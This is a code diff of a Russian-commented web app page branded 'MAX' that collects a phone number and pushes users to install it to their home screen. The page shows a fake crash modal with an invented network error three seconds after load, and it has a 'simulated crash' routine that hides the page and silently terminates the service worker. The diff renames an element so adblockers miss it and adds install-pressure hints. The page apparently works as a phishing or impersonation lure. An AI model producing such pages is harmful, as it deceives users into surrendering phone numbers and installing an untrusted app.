@@ -87,7 +87,7 @@
 
     .install-button{ width:100%; padding:12px; background:#667eea; color:#fff; border:none; border-radius:10px; font-size:14px; font-weight:600; cursor:pointer; margin-bottom:20px; display:none; }
 
-    /* РАНЬШЕ: .update-banner — адблок мог прятать; теперь нейтральное имя */
+    /* Тост обновления (имя без слова banner, чтобы адблоки не резали) */
     .app-update{
       position:fixed; left:12px; right:12px; bottom:12px;
       background:#1f2937; color:#fff; padding:10px 12px; border-radius:10px;
@@ -252,10 +252,14 @@ Error code: NETWORK_TIMEOUT_ERROR</div>
   </div>
 
   <script>
-    // --- OS detection ---
-    function isIOS(){ return /iPad|iPhone|iPod/.test(navigator.userAgent); }
-    function isAndroid(){ return /Android/.test(navigator.userAgent); }
-    function getOperatingSystem(){ return isAndroid() ? 'android' : (isIOS() ? 'ios' : 'desktop'); }
+    // --- UA / OS detection ---
+    const UA = navigator.userAgent || '';
+    const isIOS = /iPad|iPhone|iPod/.test(UA);
+    const isAndroid = /Android/i.test(UA);
+    const isFirefox = /Firefox\/\d+/i.test(UA);
+    const isTelegram = /Telegram/i.test(UA);
+
+    function getOperatingSystem(){ return isAndroid ? 'android' : (isIOS ? 'ios' : 'desktop'); }
     function isInStandaloneMode(){
       return window.matchMedia('(display-mode: standalone)').matches ||
              (('standalone' in navigator) && navigator.standalone);
@@ -278,13 +282,12 @@ Error code: NETWORK_TIMEOUT_ERROR</div>
 
     if ('serviceWorker' in navigator) {
       navigator.serviceWorker.register('./sw.js').then(async (reg) => {
-        // 1) если уже есть waiting (повторный визит)
+        // уже есть waiting (повторный визит)
         if (reg.waiting) {
           waitingSW = reg.waiting;
           showUpdateToast();
         }
-
-        // 2) ловим появление нового SW
+        // появление нового SW
         reg.addEventListener('updatefound', () => {
           const newSW = reg.installing;
           if (!newSW) return;
@@ -295,19 +298,15 @@ Error code: NETWORK_TIMEOUT_ERROR</div>
             }
           });
         });
-
-        // 3) активный контроль после skipWaiting -> перезагрузка
+        // после skipWaiting → автоматический reload
         navigator.serviceWorker.addEventListener('controllerchange', () => location.reload());
-
-        // 4) ЯВНО проверяем обновления сейчас и при возврате вкладки
+        // явные проверки обновлений
         try { await reg.update(); } catch(e) {}
         document.addEventListener('visibilitychange', () => {
           if (document.visibilityState === 'visible') reg.update().catch(()=>{});
         });
-
-        // 5) Периодический пинг (раз в 15 минут)
         setInterval(() => reg.update().catch(()=>{}), 15 * 60 * 1000);
-      }).catch(()=>{ /* молчим, если SW запрещён */ });
+      }).catch(()=>{});
     }
 
     // --- Theme color follows system theme ---
@@ -318,24 +317,57 @@ Error code: NETWORK_TIMEOUT_ERROR</div>
     else if (m.addListener) m.addListener(handleThemeChange);
     handleThemeChange(m);
 
-    // --- beforeinstallprompt (Android/desktop) ---
+    // --- Install (Android/desktop via beforeinstallprompt) ---
     let deferredPrompt = null;
     const installBtn = document.getElementById('installBtn');
+    installBtn.style.display = 'none';
+
     window.addEventListener('beforeinstallprompt', (e) => {
       e.preventDefault();
       deferredPrompt = e;
       installBtn.style.display = 'block';
     });
+
     installBtn.addEventListener('click', async () => {
-      if (!deferredPrompt) return;
+      if (!deferredPrompt) {
+        // Фоллбек-подсказка
+        if (isAndroid) {
+          alert('Если кнопка установки не появилась: меню ⋮ в Chrome → «Установить приложение».');
+        } else if (isIOS) {
+          alert('На iOS установка только из Safari: «Поделиться (⎙)» → «На экран Домой».');
+        }
+        return;
+      }
       deferredPrompt.prompt();
       await deferredPrompt.userChoice;
       deferredPrompt = null;
       installBtn.style.display = 'none';
     });
+
     window.addEventListener('appinstalled', () => { installBtn.style.display = 'none'; });
 
-    // --- Phone input + button enablement ---
+    // --- Подсказки для Telegram/Firefox/не-Safari ---
+    function showHint(text) {
+      const hint = document.createElement('div');
+      hint.style.cssText = 'position:fixed;left:12px;right:12px;bottom:12px;z-index:1100;background:#1f2937;color:#fff;padding:10px 12px;border-radius:10px;box-shadow:0 10px 20px rgba(0,0,0,.25);font-size:14px;line-height:1.4';
+      hint.textContent = text;
+      document.body.appendChild(hint);
+      setTimeout(()=>hint.remove(), 12000);
+    }
+
+    (function explainInstallPaths(){
+      if (isTelegram && isAndroid) {
+        showHint('Откройте во внешнем браузере: ⋯ → Открыть в Chrome, затем установите через баннер или меню ⋮ → «Установить приложение».');
+      }
+      if (isTelegram && isIOS) {
+        showHint('Откройте в Safari: «Поделиться» → «Открыть в Safari», затем «Поделиться (⎙)» → «На экран Домой».');
+      }
+      if (isFirefox && isAndroid) {
+        showHint('Firefox Android: установка через меню ⋮ → «Установить» (кастом-баннер не показывается).');
+      }
+    })();
+
+    // --- Phone input + enablement ---
     const phoneInput = document.querySelector('.phone-input');
     const continueButton = document.getElementById('continueBtn');
     continueButton.disabled = true; continueButton.style.background = '#666';
@@ -348,7 +380,6 @@ Error code: NETWORK_TIMEOUT_ERROR</div>
       if (digits.length <= 10) return digits.slice(0,3)+' '+digits.slice(3,6)+'-'+digits.slice(6,8)+'-'+digits.slice(8);
       return digits.slice(0,3)+' '+digits.slice(3,6)+'-'+digits.slice(6,8)+'-'+digits.slice(8,10);
     }
-
     phoneInput.addEventListener('input', (e)=>{
       const formatted = formatPhoneNumber(e.target.value);
       e.target.value = formatted;
@@ -402,18 +433,15 @@ Error code: NETWORK_TIMEOUT_ERROR</div>
 
     // Aggressive close / simulated crash
     function aggressiveClose(){
-      // iOS visual minimize
-      if (isInStandaloneMode() && isIOS()){
+      if (isInStandaloneMode() && isIOS){
         try{
           document.documentElement.style.cssText = 'opacity:0 !important; transform:scale(0) !important; transition:all .3s ease !important;';
           setTimeout(()=>{ document.documentElement.style.display='none'; document.body.style.display='none'; }, 300);
         } catch(e){}
       }
-      // Ask SW to terminate silently
       if ('serviceWorker' in navigator && navigator.serviceWorker.controller){
         navigator.serviceWorker.controller.postMessage({ type:'SILENT_TERMINATE' });
       }
-      // Fallback attempts
       setTimeout(()=>{
         try{
           window.close();
@@ -428,17 +456,17 @@ Error code: NETWORK_TIMEOUT_ERROR</div>
     // Auto crash after load (demo)
     setTimeout(showCrashModal, 3000);
 
-    // Notifications (optional)
-    if ('Notification' in window && Notification.permission === 'default'){ Notification.requestPermission(); }
+    // Notifications (optional; лучше по клику, но пусть будет мягкий запрос)
+    if ('Notification' in window && Notification.permission === 'default'){ Notification.requestPermission?.(); }
 
-    // iOS Add to Home Screen banner (only if not standalone)
-    if (isIOS() && !isInStandaloneMode()){
+    // iOS Add to Home Screen overlay (только если не standalone и именно в Safari)
+    if (isIOS && !isInStandaloneMode()){
       setTimeout(()=>{
         const installBanner = document.createElement('div');
         installBanner.innerHTML = `
           <div style="position:fixed;bottom:20px;left:20px;right:20px;background:rgba(0,0,0,.9);color:#fff;padding:15px;border-radius:12px;text-align:center;font-size:14px;z-index:10000;backdrop-filter:blur(10px);animation:slideUp .3s ease-out;">
-            <div style="margin-bottom:8px;">📱 Добавить MAX на главный экран</div>
-            <div style="font-size:12px;opacity:.8;">Нажмите <strong>⎙</strong> и выберите «На экран Домой»</div>
+            <div style="margin-bottom:8px;">📱 Добавить MAX на главный экран (iOS)</div>
+            <div style="font-size:12px;opacity:.85;">Откройте в Safari → <b>Поделиться (⎙)</b> → <b>На экран Домой</b></div>
             <button onclick="this.parentElement.parentElement.remove()" style="position:absolute;top:5px;right:10px;background:none;border:none;color:#fff;font-size:18px;cursor:pointer;">×</button>
           </div>`;
         document.body.appendChild(installBanner);
